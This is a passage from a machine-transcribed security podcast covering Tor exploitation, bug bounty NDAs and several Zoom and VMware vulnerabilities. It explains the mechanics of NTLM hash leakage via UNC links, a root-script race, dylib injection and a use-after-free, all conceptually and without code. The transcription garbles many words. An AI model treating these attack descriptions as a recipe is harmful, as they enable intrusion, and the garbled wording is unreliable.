Let me clarify first and foremost I can't 100% say right now that that's happening because I haven't no one obviously if they're being very hush-hush about it this happens every time with some of those well there's a campaign out there like what does that mean who is it you know so I don't know a hundred percent what that means in terms of this the specific one but you know it would be silly and my eyes for any nation state especially some of the more One's targeting various individuals right within the dark web who use Tor Browser and stuff like that. It would be almost nonsensical for them not to leverage that right now assuming that that's what this lens its capability towards right targeting users and exploiting them which it sounds like it does. You know, if you look at most of at least from my understanding the targeting of Tor users a lot of the exploits haven't even been sophisticated or relatively new right? It's always been people using outdated browsers and should I don't think for the most most part you're going to see like a lot of exploits getting dropped on Tor users that are relatively new may be attacking the service itself. But for this specifically to answer question. Yeah. I mean if it's something that targets to our Firefox, which is what's or browser is based off of I would be surprised if they decided no unless they've got so many exploits available. But even then again, it's just something to add to your Arsenal, you know, so I 100% it would be an easy just addition to anything that's assuming they can get the information out there. We don't Enough about the campaign and what details are out there, so it may not even be applicable just yet. If it's something that was only partially observed,\", \"start\": 1786.8}, {\"speaker\": 1, \"line\": \" you know. Yeah, which is a I think Fair Point on that. I mean we can't know for sure who was being targeted with it. I think it's a reasonable to say that the Tor Browser is one of the juicier Target. If you are writing the eau de using it in the wild that said the Firefox users can also be generally are going to be a little bit more technically oriented. So it can also just be a position thing where maybe the Firefox user also happens to be a sysadmin with Access to more stuff or other reasons why you might talk that so it could be unrelated to\", \"start\": 1906.8}, {\"speaker\": 3, \"line\": \" tour. Yeah, okay fair enough. I was just curious on Auntie's take because I didn't know how common those types of attacks were. So yeah, I just you know, I wanted to get that in before you left because I imagine you probably are you going to jump out now anti or are you good for a little while? I'll probably jump out now but yeah, I mean summarize yet, you'll see if it doesn't get released. I don't think you'll use seeing used against a lot of average users because most botnet owners and people, you know, targeting regular people often need the actual POC code itself, so Yeah, no, we know in the targeted. So that's it from me. I'll hop off and pop to listen later if you guys crapping on the other people.\", \"start\": 1946.2}, {\"speaker\": 1, \"line\": \" All right, thanks for joining\", \"start\": 1986.8}, {\"speaker\": 3, \"line\": \" us. Thanks. Y'all have a good one. All right, so we'll jump into the bug Bounty platforms topic. So we have a topic by CSO and it's basically saying bug Bounty platforms by researcher silence violate labor laws critics say so, you know one topic we've talked about a lot on this show is bug bounties and You're not disclosure should be allowed and generally I think we agree. It's reasonable to some degree. The vendors have the final say on what a report goes public or if it does at all after it's been reported through Bounty program. Well, it seems that's being challenged. So your\", \"start\": 1987.8}, {\"speaker\": 1, \"line\": \" I at least want to say I think and I want to be really clear Ideal World full transparency. Everyone has bounties Look at that for a sec you could have night in. Yeah. So in an Ideal World will have full transparency all vulnerability reports become made public and everybody has bounties that's kind of your ideal case, I believe but we don't we get there step by step. We're not at that point yet, obviously, and actually I will I will step that back a little bit maybe not every company has bounties. I do believe bounties or some that should be introduced once the Once your security is fairly mature, you don't want to just have somebody. Oh, I just wrote this over the weekend. Well, hey, here's you know a hundred bucks for every bug you find and like, you know, put them out of\", \"start\": 2022.3}, {\"speaker\": 3, \"line\": \" business. Yeah, you end up throwing money away.\", \"start\": 2071.8}, {\"speaker\": 1, \"line\": \" Yeah, like it's part of the maturity process to end up adding a bounty end. But Ideal World is generally speaking one sermon speaking about mature companies and companies that have a mature security process vulnerability should be disclosed. Publicly and and and they should have a bounty and I do also want to adjust as we get started on this draw really quick distinction because we're going to be talking about like nda's and agreements before you're even able to start testing itself that there is there's two kind of types of applications. You could be testing. This is a very wide Description but either an application that is hosted by somebody else. So if you're testing Facebook, you're not self-hosting Facebook or PayPal or something like that. You're not self-hosting those things. Somebody else is hosting its so in order for you to test you need their permission. Otherwise, it's unauthorized access and the Computer Fraud and Abuse Act and the u.s. Is insanely vague when it comes to actually defining what unauthorized access is Although I think actually some of that may have changed recently. There was something about the terms of service not being is binding. Although I know there have been cases where terms of service and basically, well you violate the terms of service. Therefore all your access was unauthorized than it was Computer Fraud and Abuse self sudden, I think something about that changed. I don't follow a lot of the legal cases. So maybe I'm wrong, but generally speaking. I'm just going to be speaking under that assumption unauthorized access. If you don't have permission to be hitting that hopes that application that's somebody else Helsing the other type of application. You can be testing our self hosted things things that you could run locally if you want to test Android if you want to like work on your Android phone you could do that or Linux your operating system running a web server locally. You can test all that kind of self hosted you can do whatever you want on those service. It doesn't matter what the ndaa As you're breaking no laws by doing that local testing. Well, if you violate their dmca can come in there are some things but generally speaking you're not violating any laws by doing that sort of local testing. I just wanted to bring that up because when we talk about bounties most of them are these hosted applications, some of them are self hosted and I think a lot of what's going to come up really has to do more with the hosted applications, which is most bounties that you see on The program like cat or one or bug crowd.\", \"start\": 2074.5}, {\"speaker\": 3, \"line\": \" Okay, so bring up the point you were saying earlier with like in an Ideal World. Everyone would have bounties. It actually seems like some researchers are challenging that a little bit they're pushing for vulnerability Discovery programs instead of bug bounties. I have if there's a little bit of like a different term like set of rules with that. It's a bit more like you can't Outsource it. I think are you\", \"start\": 2235.1}, {\"speaker\": 1, \"line\": \" sure about that? Because I thought it was vulnerability disclosure. Programs not discovery, which is a different part of the process because they talk on V DP which is vulnerability disclosure\", \"start\": 2258.3}, {\"speaker\": 3, \"line\": \" policy. Sorry. That's what I meant VDP.\", \"start\": 2269.5}, {\"speaker\": 1, \"line\": \" Okay. So VDP that was slightly different VDP is and this article actually I think just makes a mistake kind of conflating VP with coordinated disclosure if EDP is just the disclosure program. So having like a Security Act email address or the secure. T dot txt file having a way for researchers to reach out and disclose vulnerabilities to you in a safe way in a way that they're not going to be charged with a crime for doing so that's what the VDP is. Okay. So that's a little bit different bounties separate from that. And yes, every company not just mature companies should have a VDP. Some people do have questions about the bounties will be getting to that later on in this topic. But I guess when we just start off going through in order here, one of the first things that comes off our first issues really raised comes down to the Safe Harbor and NDA. So like I just mentioned reporting a vulnerability you kind of end up in a case where if you report the issue they can then say well that was unauthorized access. We're going to charge you, you know your going to be prosecuted for that crime, even though you're trying to do the right thing by reporting vulnerability and this is definitely happened. And I think I've talked about my views on disclosure of ought over the last few episodes and I think a big part of kind of my weariness and like always deferring to what the company wants comes down to kind of having had my start and the days where people definitely were being resident. They weren't operating in the most Adamant manner, you know testing for SQL injection on every website you visit type thing. But you know, they'd report that and then get charged with the crime for it there. They're testing definitely wasn't. Wasn't in line with what would be considered responsible and I'll be fair to admit that but at the time basically there was no option. Now. You can run vm's you can do with law without needing to actually test on somebody running a real server. There's a lot you can do but you know still for teenagers in the late 90s early 2000s. It was definitely a lot harder to do that and at that time people would test and report an end up charged with I'm so I think that's kind of where some of my views on just letting the company do whatever comes in. So now jumping back to the safe harbor Safe Harbor is just that you won't be charged with the crime. What's happening with bugcrowd hacker one with private bounties is that you'll basically be told sign this NDA you'll be added to the private Bounty and then you can report your vulnerability. So you can talk about the show before you can disclose or they basically set a gag order on anywhere. You can't talk about here issue if you want to disclose it to them. Or if you want to do the responsible thing and\", \"start\": 2272.0}, {\"speaker\": 3, \"line\": \" yeah, basically trying to punish people for for going the right way. Well, so\", \"start\": 2465.9}, {\"speaker\": 1, \"line\": \" here's the other thing though and it is worth noting like most vulnerability assessment have an NDA, you know real world assessments when you're working for a company that's been hired to do an assessment. You have an NDA. I can't, you know talk to you about all the vulnerabilities I found in whatever clients I've had. Now there's an NDA there like that is a pretty standard process. It's just like you don't want to effectively humiliate your client so it is different with these. Well, so again that kind of comes down. I definitely there are cases where I don't know. I'm just trying to think here if I can come up with a good example where perhaps it would be a good idea not to publicly disclose or at least not and when we talk about it publicly disclosed generally where I'm assuming I'm assuming things have been patched and have had people who've had time to update. And in that case like know as I did say earlier, actually, I do think all vulnerability should eventually become public. So there's no case where they shouldn't at the same time when a company is hiring, you know, a pen testing firm. Any funding is going to be damaging to their reputation. No matter what so I can understand the company not wanting to expose that and I want to be yeah, we had these vulnerabilities and thus they're hiring researchers do it at the same time. I mean, yeah, I would like to see those public but I get why company wouldn't want that out there, especially if it's pre-release products. I know for me A lot of times we'd be brought on kind of during the standard release cycle. So it's like we are about to release this get the security testing on it just before it actually gets released. So then those vulnerabilities never even would've made it to the public at\", \"start\": 2469.2}, {\"speaker\": 3, \"line\": \" all,\", \"start\": 2592.7}, {\"speaker\": 1, \"line\": \" and I think I can at least Understand if it's part of your kind of secure development lifecycle. not publicly disclosing those\", \"start\": 2594.0}, {\"speaker\": 3, \"line\": \" vulnerabilities I think part of the reason that like the non-disclosure like security researchers taken issue with the NDA is they'll basically use it on researchers who submit issues so that they can't talk about the issue publicly. And like you said, they can't damage the company's reputation\", \"start\": 2602.6}, {\"speaker\": 1, \"line\": \" was so that's a little bit different and external researcher versus being the hired by the company to do\", \"start\": 2619.7}, {\"speaker\": 3, \"line\": \" okay now is make certain point like talking about external\", \"start\": 2626.6}, {\"speaker\": 1, \"line\": \" researchers. This is I was making the point that most assessments. So do happen under an NDA. Most okay assessments aren't bad. Well, I don't actually know the numbers to compare like literally like our most requests generated by bounty hunters or by hired can hire Consultants or whatever but generally speaking there are a lot of Assessments that do happen under an NDA that are just they're hired to do it. It's not under some sort of public bug Bounty that said there's a trade-off when it comes to public bug bounties. And I'm going to and I'm going to say like I don't agree with having an NDA to report a vulnerability. In general, I mean, I think more Andy like a timed NDA where it's like you can talk about this until it's patch or until we reject the issue or something. I think that's fair. Like, you know, you can't report this about our can't report this bug to us and then just start talking about it immediately give them time to fix it, you know, basically Force coordinated disclosure. What do you disagree with that or kind of\", \"start\": 2628.9}, {\"speaker\": 3, \"line\": \" agree? I think that's fair. But I think what the researchers are arguing is they're basically saying, you know, once your important issue to them, you can never talk about it and what\", \"start\": 2697.9}, {\"speaker\": 1, \"line\": \" yeah, and I wouldn't agree with that I'm saying like as long as there is a timeline for\", \"start\": 2707.3}, {\"speaker\": 3, \"line\": \" disclosure. Oh, yeah, exactly. But that's what they're arguing is that you know, they trust\", \"start\": 2711.7}, {\"speaker\": 1, \"line\": \" so oh, yeah, they're arguing lurpak. You can't what kind of\", \"start\": 2716.7}, {\"speaker\": 3, \"line\": \" Harkens back to is issues that were reported last year by Jonathan list Sookie. I hope I'm saying that right and it actually relates a little bit. It to zoom it was issues found in the zoom client. So we tried contacting them to get the bugs fixed and he offered them, you know, the standard 90-day disclosure deadline to ship a patch and then you know after that 90-day deadline he would disclose it to the public and they kind of they didn't want that. They wanted him to accept the Bounty and sign an NDA that would have forbade him from you know, publicly disclosed in the issue and I think the reason that researchers are wary of that is they're worried that they're basically Going to by The Silence of the researcher and they're not going to fix the issue or they're not going to take the issue seriously and fix it like way down. The line after could have been abused by, you know, malicious actors during that time period so I think that's why there's like more of a stigma around bug bounties why some of these researchers is this like you're buying my silence and not actually fixing the\", \"start\": 2720.6}, {\"speaker\": 1, \"line\": \" issue. Yeah, and I'm actually going to say like, this is something that I think hacker one is in a really good place to change. You know if they so I again get you get there and steps getting to that fool complete transparency all the time you get there and steps. So what I could see is like having a plant, you know, a company signs up with hacker one because hacker one does offer a lot of benefits to come near homes having the bug triage having some of that so they're not getting all the garbage report and then they get a little bit of tension if you offer a bit of money, there's and how One just makes it easy for the company's so hacker wants in a good place. So to also start pushing those companies towards a better model where their disclosures and hacker one doesn't do this, but I think something hacker one could do is a company signs out with them. Okay, you don't need to disclose anything in your first year with us. But in your second year, you know, you need to be disclosing, you know, all of your critical vulnerabilities. Or you know and in your second, or maybe maybe they'll go the other way like but having some sort of step-by-step process were over time. They're going to increase the amount of disclosure. They have and working them up towards that I think that's something hacker one could do they don't do it, but given the position that they're in they could easily leverage their position to walk to do something like that, which I think would push security forward in general. I don't just want to say well bounties are all bad because Some companies abuse and EA aspect.\", \"start\": 2778.8}, {\"speaker\": 3, \"line\": \" No, you don't want a tart like tard all with the same brush, but I think like, you know, they're arguing that perhaps a better system should come along but that being said, I don't know what that system would look like. You know what I mean?\", \"start\": 2877.7}, {\"speaker\": 1, \"line\": \" Oh, no, I think what I just suggest that would be at least a fair way to go about it requiring companies to slowly start disclosing more and more. Leading them up in that maturity\", \"start\": 2890.5}, {\"speaker\": 3, \"line\": \" process. Now one thing I did want to touch on is one of the more interesting points, I guess of the article and take keep this in mind like anybody listening like neither of us are lawyers. So this is going to be you know, if there's any lawyers listening they may be like these guys have no clue what they're talking about. But anyway, they talk about the legal implications of bug Bounties in California. And with the EU with GDP are now I think the the California one's kind of silly. It's basically Doing on minimum wage and I think the argument is just dumb. Yeah\", \"start\": 2900.8}, {\"speaker\": 1, \"line\": \" with the so here's the thing and I just kind of feel like bug bounties. They kind of related to being like Uber driver or something like that that gig economy and Bug bounties are less like that and more like a contest the skill-based contest. Yeah where you're finding bugs something that requires skill and you're getting rewarded for doing so it's a contest. And they're not I would argue. It's a contest and I think that makes a\", \"start\": 2932.0}, {\"speaker\": 3, \"line\": \" difference. You're not an employee. You shouldn't be getting paid a minimum wage for bug hunting like they're kind of suggesting there. I think the more interesting one will though was the gdpr point and I think what they were trying to argue there was like users have the right to know if there's a potential breach due to issues that are found and that should therefore mean that those issues should always be publicly disclosed after their fixed so I was kind of curious on what your thoughts were on that.\", \"start\": 2962.6}, {\"speaker\": 1, \"line\": \" Yeah. So a lot of bounties that will include information are will include terms about and I mean with all that were saying, you know, we're not saying that companies should just allow all testing to happen. There are still limits on what you can do with your test think so one of those terms of generally get set has to deal with not trying to access or being careful about the type of data that you do access you're not allowed to, you know, get on a bug Bounty program and just just try and dump the entire\", \"start\": 2991.2}, {\"speaker\": 3, \"line\": \" database. Hey you when you do when you do\", \"start\": 3020.7}, {\"speaker\": 1, \"line\": \" that testing will usually create our least when I do test saying I'll create two accounts for every privilege level at a minimum, perhaps more. It depends on the application. So generally like you're trying to access another user's account. So you access your own accounts like another account that you own rather than just random client data, and I believe that at least kind of helps when it comes to the GDP are because you still shouldn't be exposed. Seeing actual client information you should be pulling down actual, you know credit card information or something like that that said that Specter was saying I'm not a lawyer perhaps with gdpr that doesn't matter and just if you have a vulnerability that could have been used to breach this data. That's all that's needed that said I would agree though with the statement that if a bounty hunter does pull out personally identifying information does full any sort of that information out. That should be you know that That is a data breach bounty hunters are not part of the company and shouldn't count as part of the company in that sense. So I largely agree with what they stated their whether or not the regardless of the legal sense. Like I largely agree that it should be counted as a breach if a bounty hunter actually pulls down that sensitive information intentionally or\", \"start\": 3024.0}, {\"speaker\": 3, \"line\": \" not. Yeah, okay. Yeah, I mean I kind of agree I wouldn't be surprised if we see gdpr come into bounties a little bit more just because I think gdpr was like intentionally left very big so it could absolutely be brought into like this area and be applied\", \"start\": 3102.8}, {\"speaker\": 1, \"line\": \" if I mean, it's responsible testing as a researcher. You should not be trying to pull down the entire database. You should not be trying to just pull all the information you can. I think we kind of talked about you know researchers behaving and a badly in it some time ago. I don't remember what the report was, but I'm sure it's come up before.\", \"start\": 3122.4}, {\"speaker\": 3, \"line\": \" Yeah, I know we talked about it when there was a guy was trying to report an issue through Twitter and then he basically just like Traverse the network and writing deeper. Yeah, I forget what episode exactly but it was fairly recent. It was in the last couple of weeks. I wanna\", \"start\": 3146.7}, {\"speaker\": 1, \"line\": \" see. Yeah. Well, no, I think it was longer than that. But because well, what was that? Was it some sort of? It was like clothing or something.\", \"start\": 3159.9}, {\"speaker\": 3, \"line\": \" It was actually it was directly in the title. So you can find a pretty easily because it was the title was a dark white hat hacker or something like that. So our episode episode 18. Oh, wow. Whoa that long ago.\", \"start\": 3172.0}, {\"speaker\": 1, \"line\": \" Well, I think my notes to double-check\", \"start\": 3186.4}, {\"speaker\": 3, \"line\": \" Knows episode 30. Okay, so\", \"start\": 3191.2}, {\"speaker\": 1, \"line\": \" here that I thought that just the first steps that they came up. But yeah, it's this is one of those things where as a researcher. You still need to respect, you know, because it is live client data when you're testing on a lot of these bounties you're testing on the live web sites live applications. Sometimes you are testing on test environments. They do provide test environment. So that's a little bit different too. But you do have to be careful with your issues, you know, you don't they generally don't allow you to test it out of service issues. You're not allowed to bring down production just because you're a white hat So you\", \"start\": 3193.9}, {\"speaker\": 3, \"line\": \" claim? So I think we can move into some exploits continuing our Zoom Feast into the exploit section of the show. We have one here related to UNC paths and how those links are rendered to be clickable which can allow people to steal ntlm hashes. So for those who don't know what UNC paths are there based Universal naming convention is what it stands for and it can be used to access network resources and whatnot. It's used by Windows.\", \"start\": 3228.2}, {\"speaker\": 1, \"line\": \" Yeah. Basically you've seen this when you see the double backslash followed by like a server hostname or IP. Something. Yeah, those are UNC paths.\", \"start\": 3254.3}, {\"speaker\": 3, \"line\": \" So generally speaking as for example,\", \"start\": 3263.4}, {\"speaker\": 1, \"line\": \" yeah, so when you try and access one of those URLs on Windows, it'll send your credentials to that endpoint. So in Zoom when you send such a link, it'll create our when you send such a yours UNC it'll turn that into a link you can just click and then windows will do its default thing try and open it. And it'll send your ntlm hash over to the Target server. That's the actually it's kind of an issue with Windows. Just sending your authentication by default. Although it is kind of a sane move to send. Credentials you can turn it off by default. I'd recommend doing that and then you just have to manually basically get it to send which I think would be a more sane default, but I kind of understand the history here. So Zoom make some clickable. They're calling this a actually I saw this\", \"start\": 3265.4}, {\"speaker\": 3, \"line\": \" talked about quite a\", \"start\": 3324.1}, {\"speaker\": 1, \"line\": \" bit. I mean this was blown way out of proportion. That's that's kind of what I was going to find a way to say is the gist of this is don't click random links, especially not random links that are UNC paths. I was actually I was on a Discord. We're in the staff chat. They actually asked like do we want to you know, add everybody about this because it's such a huge issue. It's just like one they don't normally alert people about issues at all to Don't click links like this. Isn't that big of an issue? Don't get me wrong. And actually I will say like for Zoom doing it like zooms. You said a lot of business contexts where you're going to have these sorts of Link's flowing around. It makes sense to make them clickable. I would put this moron I think window should maybe do a more same default. By not sending them by default and just you know prompting forward or something. Like I would put more fault on Windows. Just having this is the default rather than on so making it a\", \"start\": 3325.1}, {\"speaker\": 3, \"line\": \" link. When I saw this issue I pinned it as basically a glorified phishing attack while you could argue Zoom could try to mitigate the issue by not making UNC paths clickable. It's ultimately a user issue that people need to be made aware of where like, you said, you shouldn't just be clicking random links, especially where like, you know, UNC path links are going to look more suspicious than your typical link as well.\", \"start\": 3394.4}, {\"speaker\": 1, \"line\": \" You don't really want to to be fair. I just don't trust users like just random non-technical users to get that. I get in all fairness. I just don't I agree with you like the end. It's such a simple as you to avoid. I just don't have enough faith in random non-technical users on to learn to recognize a UNC path and oh, okay. Don't click that. I mean no doubt they could but I just don't have a lot of faith in that one.\", \"start\": 3425.0}, {\"speaker\": 3, \"line\": \" What I think would be reasonable is for UNC path links, perhaps they could add like a warning dialog on clicking it saying what's that sound? I think this is exactly what it does. And do you still want to continue with it? You know what I mean?\", \"start\": 3458.9}, {\"speaker\": 1, \"line\": \" I mean a lot of users are just going to click over that. What was that? A lot of users are just going to click over those sorts of warning like oh you're it's the same thing as those external warnings like oh you're going to an external website, you know, like discordian gets the, you know, external links or spooky or whatever. That's Trevor that warning is like people just click through those alerts if they get them too often. That's why I feel like it would be better off if a Windows had some sort of prompt by default be like, hey, either you're sending this over the Internet or even just over the net. Well, I guess it's going to be over the network, but you know, perhaps even trusting the local network or you know, if you're on a VPN it's going to appear local at least. Versus over the Internet like just sending it to these external hosts. It just doesn't was I said before and insane default. But yeah, this issue like this feels like kind of mentioned earlier about the cloud chasing. Yeah, that's what this feels like just kind of putting out there know to be fair and tlm hashes\", \"start\": 3471.8}, {\"speaker\": 3, \"line\": \" easily broken.\", \"start\": 3542.1}, {\"speaker\": 1, \"line\": \" So basically, they're getting your Windows password. I want to fit is the gist self kind of what's Happening that that is an issue. Like the root of the issue is definitely a serious\", \"start\": 3544.3}, {\"speaker\": 3, \"line\": \" concern.\", \"start\": 3555.0}, {\"speaker\": 1, \"line\": \" I just don't think it's zooms real fault here.\", \"start\": 3556.7}, {\"speaker\": 3, \"line\": \" Yeah. I don't think they bear like a lot of the blame. I think they could try to help they could\", \"start\": 3560.8}, {\"speaker\": 1, \"line\": \" do more and I believe they've just\", \"start\": 3565.2}, {\"speaker\": 3, \"line\": \" disabled UNC paths now is being links. Yeah fair enough.\", \"start\": 3566.9}, {\"speaker\": 1, \"line\": \" Which I mean Fair response to it. I just I agree with you when he said it's been\", \"start\": 3572.0}, {\"speaker\": 3, \"line\": \" overplayed. Yeah, so I think that is our last ours our last same\", \"start\": 3577.6}, {\"speaker\": 1, \"line\": \" topic. Nobody's got one\", \"start\": 3584.0}, {\"speaker\": 3, \"line\": \" more Oh, no, you're right. Our next one is actually a zoom topic\", \"start\": 3585.6}, {\"speaker\": 1, \"line\": \" to actually to vulnerabilities in this one. Yeah, this is two things one is the local privilege escalation to root on I think both of these. Yeah, both of these are on OS\", \"start\": 3590.4}, {\"speaker\": 3, \"line\": \" X so they're both Mac OS based issues.\", \"start\": 3604.7}, {\"speaker\": 1, \"line\": \" Yeah, so Both of these are LP2 wrote and code injection that gives you access to the microphone and Camera. Basically, they just discovered and this was another one that I saw getting mentioned a lot witch. It's at least I'd argue about it one. It's more on zooms all it's more. It's more zooms fault and maybe a little bit more useful in terms of actually doing something with it. So the gist of the first one though local privilege escalation is that the zoom installer uses this lovely API authorized ex came with privileges. Basically just a way to execute with enhanced privileges are execute is roped. The API itself is documented as being insecure shouldn't be user. I believe it's even deprecated on OS X but it doesn't validate the binary. It doesn't make sure it's signed or anything like that if the binaries read-only are can't be modified. There is otherwise protected it's still kind of okay to use it. but but with that it doesn't validate so if somebody could change the binary. They're basically to give her a note Zoom. The binary of Ron's is basically a bash script run with route. So during installation that run with root file as a period of time where it isn't protected as the installer unpacks the package file into a temporary user writable location. So somebody could exploit that by waiting for that file to eventually exist and be created and replacing with their own content and Then the installer will eventually end up running with roped. Whatever they put into that she'll file. Yeah terms of go ahead.\", \"start\": 3608.6}, {\"speaker\": 3, \"line\": \" So I'm just going to say you are you were cutting out a bit for me there. So like I apologize if I re it reiterate over an issue or you already touched over but part of what makes these issues a little bit more impactful to is it was actually discovered that the Mac OS installer would perform the install without you ever even clicking install because it abused pre-installation scripts. So on its own that shady but, you know, not necessarily malicious and But how it also gets that route privileged on the script that you're talking about that could potentially be hijacked is it'll prompt the user for root privileges. If you're not in the admin group, it doesn't prompt for root privileges as itself. It says system needs your privilege to change. It's almost like intentionally misleading to make you think that the Mac operating system needs your permission not zoom itself. So there's some shady issues on top of it. They kind of make it like even worse than that. I'd have been as well. But yeah, sorry. Yeah.\", \"start\": 3727.6}, {\"speaker\": 1, \"line\": \" Well, I was just going to add like actually trying to exploit this though is basically\", \"start\": 3788.0}, {\"speaker\": 3, \"line\": \" You need local access\", \"start\": 3794.9}, {\"speaker\": 1, \"line\": \" what you need local axes and you need to wait for that pre-installation Tappan. Yep, so you're not getting access to this like it takes a lot of patience for malware to eventually get this. And with that, I mean that definitely limits the usefulness of it in the second one here in terms of its code injection that gives you a mic and camera axis. It's effectively dll injection own OS X OS X does provide a hardened runtime Library validation which prevents prevents you from loading either are only allows you to load Apple libraries or those that are signed by the same team ID as the application itself. You can disable that which is umm goes ahead and does and therefore anybody can inject their own Library into the zoo application and then get access to the camera and a get around something formation checks the gain that one's definitely you know on zoo. Yeah,\", \"start\": 3795.9}, {\"speaker\": 3, \"line\": \" so I definitely wouldn't call this one Cloud chasing like the last issue that we covered know\", \"start\": 3862.0}, {\"speaker\": 1, \"line\": \" this this feels this feels a lot more. It impacts a bit limited. Yeah, but these are legitimate issues on Zoom that Really just shouldn't have been there to begin with the you want someone I could understand why they made another link especially if they didn't understand what clicking it does. You know, it makes sense making that a link this doing all this weird stuff. It makes like you can't you can't just explain it away as well. They should of our they didn't know any better. They should have known\", \"start\": 3867.1}, {\"speaker\": 3, \"line\": \" better as the devil's advocate for it. Yeah. Yeah, so\", \"start\": 3902.6}, {\"speaker\": 1, \"line\": \" So yeah, I like and their local privilege escalations. Yeah, it requires local access and requires kind of waiting for the right event to happen. If I think that's completely\", \"start\": 3907.1}, {\"speaker\": 3, \"line\": \" Fair it does get you rude. Yeah, like it's not like it's you know,\", \"start\": 3917.6}, {\"speaker\": 1, \"line\": \" yeah, I mean like Mel were often exists on systems for quite a while. So if this was just like, oh, we don't have any other if it likes Kansas system looking for some vulnerabilities doesn't have anything else it just kind of sits there waiting on this. Like I think that's completely fair. So like there's definitely an attack scenario with this that wouldn't be just prevented by the user being smart about what\", \"start\": 3921.2}, {\"speaker\": 3, \"line\": \" they do. Yeah,\", \"start\": 3946.1}, {\"speaker\": 1, \"line\": \" so that is our last Is umm issue though. We can that feast\", \"start\": 3949.3}, {\"speaker\": 3, \"line\": \" and yeah, well move away from Zoom. We have a zi zi blog post about a use after free in the VMware Workstation DHCP server, which was submitted to them by an anonymous researcher last month. So unlike some of the zi zi stuff we've covered in the past. This isn't like a working backwards from like a patched it for anything like that. This is an issue that was submitted to them. So the article first does a bit of a dive. Into how the DHCP release message Handler works and the gist of it for understanding the issue is it will end up copying the data from one leash structure to another so like source to a destination and it thusly structure contains various information like the client IP address the hardware address and a unique\", \"start\": 3953.7}, {\"speaker\": 1, \"line\": \" identifier. Yeah, and just and that's the supersede least function as you're saying just copies from basically the old one to the new one, but I think the name kind of met matters are in terms. Understanding what's happening whites copying the data in theory. These are generally going to be close to the same Lisa's some different information.\", \"start\": 3995.9}, {\"speaker\": 3, \"line\": \" Yeah, so when they go to take this new lease to write it to an internal table. The superseded least function does a string comparison between the uid fields of the source and destination lease objects. And if they match it'll free it to so that you know, so that the same identifier isn't duplicated. However, if you send DHCP discover and DHCP release messages repeatedly, the uid sort fields of the source and destination Leafs will point to the same\", \"start\": 4015.9}, {\"speaker\": 1, \"line\": \" memory. Yeah, which feels like a weird. Issue to have like this feels like some sort of race condition that\", \"start\": 4042.9}, {\"speaker\": 3, \"line\": \" results. Yes what I was thinking\", \"start\": 4048.7}, {\"speaker\": 1, \"line\": \" too. So you don't worry. They're not clear. They literally just say when those two messages like DHCP discover followed by the release messages repeatedly received this happens. It doesn't really go into why that happens, but eventually it does happen there. Well, yeah, I mean, I'd love to know but I guess if you're writing the exploit, it doesn't really matter. You just know if you smack you get this to happen, you know, you don't need to dig into it. So I get why it's not there. I'm just definitely curious on really how that that in particular\", \"start\": 4049.9}, {\"speaker\": 3, \"line\": \" happened. Yeah,\", \"start\": 4083.3}, {\"speaker\": 1, \"line\": \" because I don't know that that just feels like a really weird. A weird thing to have happen weird coincidence here. Yeah, so probably some sort of race condition in there. Yeah.\", \"start\": 4085.3}, {\"speaker\": 3, \"line\": \" So of course where you know both the source and destination you ID Fields point to the same memory location, the string compare will succeed and the buffer will be freed. But because the destination lease still points to that location, you have a dangling pointer and that leads to use after free. So the patch for it was very simple VMware just out of the check to make sure the source and destination. You ID field didn't point to the same location before calling the free so very simple patch the article didn't go into detail of how to exploit this to perform the VM Escape. They mostly you know left that as an exercise to the reader, which I think that gives a neat opportunity to anyone interested in the M exploitation. If you're interested in that I'd recommend giving this write up a read and perhaps trying to exploit the bug yourself. I think it's a really good candidate to get your feet wet with because often there's not a Other than throw out there about VM bugs and this post gives you detail and sort of a root cause analysis\", \"start\": 4097.9}, {\"speaker\": 1, \"line\": \" but leaves enough for you to work through the rest eat exact get tickets on quiesce you and yeah, it's a starting point for you to do an actual exploit, which is ultimately like you you can go and learn all the different techniques you want. It's doing things like this actually writing up a real exploit. Even if you start off with this information that doesn't take away from actually turning. This into a weaponized exploit and that's how you learn. It is by doing it. You can learn all the techniques. But once you've done that you just need to get the practice actually doing it.\", \"start\": 4155.3}, {\"speaker\": 3, \"line\": \" Yeah thing a question from chat from cat 3009. Could it turn out to be an exploitable? Honestly, I doubt it something as complex as a hypervisor or like, you know a virtual machine. Use after free is an extremely powerful bug-type and especially, you know, it's the VM is not Using CFI or anything like that. So I think it use after free. It's almost certainly going to be exploitable. Only thing that could end up being an issue is if the object you're freeing if you can't get a good spray on where that is on the Heap like if it's in a heap cash that you can't get a good degree of control over that might make an unexplainable, but for the most part use after fries and complex software are like, you know, they're almost always exploitable. So it probably is\", \"start\": 4188.7}, {\"speaker\": 1, \"line\": \" Yeah, well, so on that no. What's what do we have? Like the object being afraid is that uid? So that's just the string. That's going to be used after free. So it is going to kind of come down to how is that being used once you are able to obtain some control over its\", \"start\": 4237.8}, {\"speaker\": 3, \"line\": \" value? Yeah, you probably need to use it to create like, you know, propagate some bugs later on down the line that are more powerful to exploit. But\", \"start\": 4259.2}, {\"speaker\": 1, \"line\": \" yeah, I'm just I'm just trying to imagine what your bug would be from controlling the uid. I guess it's going to use that probably to track probably doing some look up based on it at some point.\", \"start\": 4269.3}, {\"speaker\": 3, \"line\": \" That's true. Actually that that's a good point. Maybe it's not as exploitable as I initially thought it I like\", \"start\": 4288.0}, {\"speaker\": 1, \"line\": \" it. It's not a complex object here. So I think it's a good question of could turn out to be on exploitable because obviously when you have like a really complicated object, there's a ton of places that you can abuse. Once you kind of are able to control that object, but I don't know enough to say how this is getting used because it seems like it's just a simple string so you'd have to look at More that string itself is being used or perhaps that shrink is being modified somewhere. And then the whatever I gets reallocated as could be what you target, which maybe if you're able to control that value at some point. I just don't know where you'd be able to modify. Uid. Excuse really that's going to come up early and stay well static so I don't see that as being a big possibility. See, I really comes down to where you IDs being\", \"start\": 4293.3}, {\"speaker\": 3, \"line\": \" used. Yeah, it's a fair point. It might not be as exploitable as I originally thought one Avenue you might be able to take as if like there's a sterling call on it though. I think that's unlikely because they do have that you ideal Enfield to so they might not ever do sterlin on that string. So you have to look more of the subsystem, I guess to see how exploitable it is. And that's a fair point. Like maybe the reason they didn't go into further detail is maybe it isn't exploitable. Although actually\", \"start\": 4350.5}, {\"speaker\": 1, \"line\": \" other wouldn't CDI mostly be buying bugs. Yes.\", \"start\": 4378.3}, {\"speaker\": 3, \"line\": \" Yes, and actually I was just thinking they have these zi advisory Link in the actual blog post. Yeah, I was cdss score there as well.\", \"start\": 4383.4}, {\"speaker\": 1, \"line\": \" So looking at that\", \"start\": 4391.6}, {\"speaker\": 3, \"line\": \" actually. Yeah, it does say privilege escalation. Oh, there's multiple see bees in there 